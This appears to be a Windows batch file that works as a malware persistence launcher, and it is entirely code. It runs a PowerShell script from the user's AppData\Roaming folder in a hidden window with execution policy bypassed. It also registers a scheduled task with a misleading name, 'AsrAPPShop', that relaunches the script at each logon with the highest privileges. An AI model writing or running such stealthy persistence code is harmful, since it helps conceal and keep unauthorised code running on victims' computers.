@echo off
start /min powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%USERPROFILE%\AppData\Roaming\c.ps1"
Schtasks /Create /TN "AsrAPPShop" /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""& (Join-Path $env:userprofile 'AppData\Roaming\c.ps1')"" /SC ONLOGON /RL HIGHEST /F
